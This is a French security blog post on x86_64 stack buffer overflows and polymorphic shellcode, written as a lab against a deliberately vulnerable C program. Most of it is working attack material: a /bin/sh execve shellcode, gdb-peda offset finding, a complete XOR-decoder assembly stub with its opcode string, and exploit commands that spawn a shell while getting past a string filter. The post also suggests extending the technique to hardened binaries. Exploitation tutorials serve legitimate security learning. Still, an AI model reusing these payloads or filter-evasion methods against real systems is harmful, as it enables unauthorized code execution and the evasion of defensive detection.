---
title: Shellcode Polymorphique x86_64
date: 2017-02-04T01:13:18+00:00
author: Zweisamkeit
layout: post
permalink: /shellcode-polymorphique/
categories:
  - Sécurité Systèmes
---
Les attaques par buffer overflow pouvant s'avérer très dangereuses, de nombreux mécanismes de défense ont été mis en place : randomisation des adresses (ASLR), pile non-exécutable (NX), canary (SSP), ou encore analyses statiques (filtrage, hash), dynamiques (exécution isolée de l'input).

Nous allons nous intéresser au contournement des mécanismes d'analyse statique, et dans une moindre mesure de certaines formes d'analyse dynamique, à l'aide d'un paradigme de shellcoding bien connu, mais très peu documenté sur l'architecture x86_64 : le polymorphisme.
1. Shellcode classique


Tout d'abord, considérons le code C suivant, comportant une vulnérabilité de type stack buffer overflow au niveau de l'appel à la fonction strcpy :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc vuln.c -o vuln -fno-stack-protector -z execstack
 
int main(int argc, char **argv){
 
* char buffer[256];
* int i=0;
 
* printf("Adresse buffer : %p\n", buffer);
* 
* strcpy(buffer, argv[1]);
 
* return 0;
}
```

Supposons par ailleurs que l'ASLR a été désactivé, que la pile est exécutable, et que le SSP a été désactivé lors de la compilation.

Dans cette configuration, il suffit de placer un shellcode 64 bits dans le buffer, et d'écraser le pointeur d'instruction de telle sorte qu'il saute au début du buffer, parcourt les nopsleds et remonte jusqu'au shellcode, qui sera donc exécuté.

Considérons le shellcode suivant, obtenu sur shell-storm, qui lance la commande « /bin/sh » :
```
\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05
```

Nous conseillons à celles et ceux qui ne maîtrisent pas la création de shellcode la lecture de ces quelques diapositives.

L'exploitation est classique :

Nous commençons par rechercher la nombre de bytes à utiliser avant d'atteindre le « saved rip », en utilisant un pattern fourni par peda, puis nous injectons notre shellcode dans le buffer, suivi de 280 - len(shellcode) nopsleds, nous permettant ainsi d'écrire l'adresse du buffer sur l'adresse de retour.
```bash
zweisamkeit@linux [ Polsh ] --> gdb -q ./vuln
[...]
gdb-peda$ pattern create 300
'AAA%[...]gA%6A%'
gdb-peda$ r < <(echo 'AAA%[...]gA%6A%')
[...]
Adresse buffer : 0x7fffffffe620

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffe0 
RDX: 0x7ffff7dd6740 --> 0x0 
RSI: 0x603020 ("Adresse buffer : 0x7fffffffe620\n")
RDI: 0x0 
RBP: 0x3425416525414925 ('%IA%eA%4')
RSP: 0x7fffffffe738 ("A%JA%fA%5A%KA%gA%6A%")
RIP: 0x4005bd (<main+87>:	ret)
R8 : 0x1 
R9 : 0x20 (' ')
R10: 0x78 ('x')
R11: 0x246 
R12: 0x400470 (<_start>:	xor* ebp,ebp)
R13: 0x7fffffffe810 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005b2 <main+76>:	call   0x400450 <printf@plt>
   0x4005b7 <main+81>:	mov* eax,0x0
   0x4005bc <main+86>:	leave  
=> 0x4005bd <main+87>:	ret* 
   0x4005be:	xchg   ax,ax
   0x4005c0 <__libc_csu_init>:	push   r15
   0x4005c2 <__libc_csu_init+2>:	push   r14
   0x4005c4 <__libc_csu_init+4>:	mov* r15d,edi
[------------------------------------stack-------------------------------------]
[...]
gdb-peda$ pattern search 'A%JA%fA%5A%KA%gA%6A%'
[...]
Registers point to pattern buffer:
[RSP] --> offset 280 - size ~20
[...]
exit
zweisamkeit@linux [ Polsh ] --> ./vuln $(python2.7 -c 'print "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"+"\x90"*252+"\xb0\xe5\xff\xff\xff\x7f"')
Adresse buffer : 0x7fffffffe5b0
sh-4.4$
```

Et nous obtenons effectivement un shell.
2. Shellcode Polymorphique


Remarquons que, dans notre shellcode, nous avons la chaîne « \x2f\x62\x69\x6e\x2f\x73\x68 », soit la représentation hexadécimale de le la commande « /bin/sh » - ce qui n'est pas étonnant, étant donné qu'il s'agit du paramètre que nous passons au syscall execve.

Cela peut poser problème lorsqu'un certain nombre de protections que nous citions dans l'introduction sont mises en place. Prenons l'exemple le plus simple : les entrées sont filtrées, de telle sorte que l'on ne puisse pas injecter de chaîne contenant, par exemple, le mot « bin », représenté en hexadécimal par la chaîne « 62 69 6e », qui pourrait être un shellcode.

Reconsidérons le code utilisé dans la première partie, agrémenté d'un filtre sur la chaîne hexadécimale « \x62\x69\x6e » :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc vuln.c -o vuln -fno-stack-protector -z execstack

int main(int argc, char **argv){

* char buffer[256];
* int i=0;

* printf("Adresse buffer : %p\n", buffer);

* char *ret = strstr(argv[1],"\x62\x69\x6e"); // filter

* if (ret!=NULL){
* * printf("%s\n","Hack attempt!");
* * return 1;
* }

* strcpy(buffer, argv[1]);

* return 0;
}
```

Tentons maintenant d'exécuter notre shellcode :
```bash
zweisamkeit@linux [ Polsh ] --> ./vuln $(python2.7 -c 'print "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"+"\x90"*252+"\xb0\xe5\xff\xff\xff\x7f"')
Adresse buffer : 0x7fffffffe5b0
Hack attempt!
zweisamkeit@linux [ Polsh ] -->
```

Le filtre a repéré une chaîne dangereuse dans l'entrée, et a donc mis un terme à l'exécution du programme.

Pour pallier ce problème, nous allons appliquer un xor sur notre shellcode afin de le rendre méconnaissable - et donc non-détectable par un système d'analyse statique représenté basiquement par un filtre -, puis, à l'aide d'un shellcode « wrapper », appelé polymorphique, nous allons mettre notre shellcode chiffré sur la pile d'exécution, nous allons charger les bytes et appliquer à nouveau un xor avec la même clé que celle utilisée lors du chiffrement, placer le shellcode ainsi déchiffré dans une zone réservée de la pile, et jumper dessus, afin de l'exécuter.

Ainsi, nous pouvons exécuter notre shellcode initial, tout en contournant le filtrage implémenté.

Nous vous proposons notre implémentation, en 64 bits, sur une architecture intel.

Nous pouvons décomposer ce shellcode en trois grandes étapes :
Initialisation des registres


* Placement sur shellcode chiffré sur la pile d'exécution ;
```asm
jmp short data ; push the xored shellcode on the stack
[...]
data :
call decrypt
shellcode: db  0x1b ,0x62 ,0xac ,0x04 ,0x04 ,0x0d ,0x09 ,0x1b ,0xec ,0x7c ,0x7c ,0x31 ,0x3a ,0x3d ,0x7c ,0x20 ,0x3b ,0x1b ,0x92 ,0xbc ,0x5b ,0x04 ,0x07 ,0x0c ,0x39 ,0x68 ,0x0b ,0x5c ,0x56
```
* Placement de l'adresse du premier byte du shellcode chiffré dans rsi, ce qui nous servira par la suite lors du déchiffrement ;

* Positionnement de l'adresse du shellcode dans le registre rsp, ce qui nous permettera de jumper dessus une fois déxoré ;

* Placement de l'adresse du shellcode dans rdi, ce qui nous permettra d'écrire les bytes déchiffrés à la place des anciens ;
```asm
pop rsi
sub rsp,0x29
lea rdi, [rsp+0x0]
```
* Placement de la taille du shellcode dans dl, qui fera office de variable de test désincrémentée à chaque itération pour notre boucle de déchiffrement ;

* Placement de la clé de déchiffrement dans le registre bl.
```asm
xor rdx, rdx 
push rdx
pop rbx 
mov dl, 0x29 ; shellcode size
mov bl, 0x53 ; key ('N')
```

 
Déchiffrement du shellcode


* Une fois dans la boucle, placement du byte courant pointé par rsi de notre shellcode chiffré dans eax, et incrémentation de rsi  ;
```asm
lodsb ; load the current byte [rsi] into eax ; rsi ++
```
* Déchiffrement du byte courant ;
```asm
xor eax, ebx ; unxor with the key
```
* Remplacement du byte courant par sa version déchiffrée (position rdi), et incrémentation de rdi ;
```asm
stosb ; store the unxored byte ; rdi ++
```
* Décrémentation de la variable de test edx, et passage à la prochaine itération tant qu'elle n'est pas nulle.
```asm
dec edx ; next byte
jnz boucle ; again, while the shellcode is not fully unxored
```

 
Exécution du shellcode


* Saut sur le shellcode déchiffré ;
```asm
jmp rsp ; jump to the unxored shellcode
```
* Construction et appel du syscall execve sur la commande exit (non-nécessaire si le shellcode initial exécute la commande exit, mais ne gène pas dans le cas contraire).
```asm
xor rax,rax
push 60 ; exit
pop rax
syscall
```

Il nous faut maintenant l'assembler, le linker et en récupérer l'opcode :
```bash
zweisamkeit@linux [ Polsh ] --> nasm -f elf64 polsh.asm -o polsh.o && ld -o polsh polsh.o
zweisamkeit@linux [ Polsh ] --> objdump -d ./polsh | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\xeb\x24\x5e\x48\x83\xec\x29\x48\x8d\x3c\x24\x48\x31\xd2\x52\x5b\xb2\x29\xb3\x53\xac\x31\xd8\xaa\xff\xca\x75\xf8\xff\xe4\x48\x31\xc0\x6a\x3c\x58\x0f\x05\xe8\xd7\xff\xff\xff\x1b\x62\xac\x04\x04\x0d\x09\x1b\xec\x7c\x7c\x31\x3a\x3d\x7c\x20\x3b\x1b\x92\xbc\x5b\x04\x07\x0c\x39\x68\x0b\x5c\x56"
```

Nous remarquons dans un premier temps qu'il n'y a pas de null byte. En effet, la clé xor a été choisie de telle sorte qu'elle n'apparaisse pas déjà dans le shellcode non-chiffré, et les instructions incluant des null bytes ont été remplacées par des équivalents.

Il ne reste plus qu'à adapter notre payload à ce nouveau shellcode (à noter que la présence du caractère « 0x20 » dans le shellcode peut jouer le rôle de séparateur d'argument - c'est la raison pour laquelle nous passons par un fichier) :
```bash
zweisamkeit@linux [ Polsh ] --> python2.7 -c 'print "\xeb\x24\x5e\x48\x83\xec\x29\x48\x8d\x3c\x24\x48\x31\xd2\x52\x5b\xb2\x29\xb3\x53\xac\x31\xd8\xaa\xff\xca\x75\xf8\xff\xe4\x48\x31\xc0\x6a\x3c\x58\x0f\x05\xe8\xd7\xff\xff\xff\x1b\x62\xac\x04\x04\x0d\x09\x1b\xec\x7c\x7c\x31\x3a\x3d\x7c\x20\x3b\x1b\x92\xbc\x5b\x04\x07\x0c\x39\x68\x0b\x5c\x56"+"\x90"*208+"\x90\xe5\xff\xff\xff\x7f"' > payload
zweisamkeit@linux [ Polsh ] --> ./vuln "$(cat payload)"
Adresse buffer : 0x7fffffffe590
sh-4.4$ cat secret

Vous ne saurez jamais que votre âme voyage
Comme au fond de mon coeur un doux coeur adopté ;
Et que rien, ni le temps, d’autres amours, ni l’âge,
N’empêcheront jamais que vous ayez été.

Que la beauté du monde a pris votre visage,
Vit de votre douceur, luit de votre clarté,
Et que ce lac pensif au fond du paysage
Me redit seulement votre sérénité.

Vous ne saurez jamais que j’emporte votre âme
Comme une lampe d’or qui m’éclaire en marchant ;
Qu’un peu de votre voix a passé dans mon chant.

Doux flambeaux, vos rayons, doux brasiers, votre flamme,
M’instruisent des sentiers que vous avez suivis,
Et vous vivez un peu puisque je vous survis.

        - Vous ne saurez jamais, Marguerite Yourcenar
```

Nous parvenons effectivement à tromper le filtre, à exécuter notre shellcode initial, et, finalement, à obtenir un shell.

Remarquons enfin qu'il semble déraisonnable d'imaginer un système qui contiendrait un mécanisme d'analyse statique, mais qui n'intégrerait pas les protections élémentaires que sont l'ASLR, le SSP et le NX. Ceci dit, ce contournement peut tout à fait être adapté à des binaires plus protégés, en le combinant à d'autres formes d'exploitation telles que l'utilisation du BSS, de variables d'environnement, ou à différentes techniques de « canary bypass ».
